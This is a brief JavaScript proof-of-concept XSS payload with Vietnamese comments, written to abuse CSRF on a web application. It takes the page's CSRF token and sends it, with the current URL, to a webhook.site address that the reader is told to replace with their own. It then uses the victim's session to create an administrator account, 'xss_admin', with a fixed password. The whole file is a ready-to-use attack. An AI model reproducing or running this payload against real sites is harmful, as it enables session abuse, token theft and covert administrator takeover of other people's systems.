// PoC: XSS khai thác CSRF để tạo tài khoản admin
// 👉 Lưu ý: Thay webhook ID trong URL bằng của bạn (dòng có webhook.site/...)

(function () {
  const token = document.querySelector('input[name="csrf_token"]')?.value;

  if (token) {
    // Gửi thông báo về Webhook (bao gồm csrf token + URL trang hiện tại)
    fetch("https://webhook.site/YOUR-WEBHOOK-ID-HERE?status=hackered"
      + "&csrf=" + encodeURIComponent(token)
      + "&url=" + encodeURIComponent(location.href));

    // Gửi yêu cầu tạo user admin
    fetch('/public/api/user.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      credentials: 'include',
      body: JSON.stringify({
        action: 'create',
        csrf_token: token,
        username: 'xss_admin',
        email: 'xss@gmail.com',
        password: '123456A@',
        role: 'admin',
        is_active: true,
        first_name: 'XSS',
        last_name: 'Payload'
      })
    });
  } else {
    // Nếu không tìm thấy token, cũng báo về Webhook
    fetch("https://webhook.site/YOUR-WEBHOOK-ID-HERE?status=no_hackered&url=" + encodeURIComponent(location.href));
  }
})();
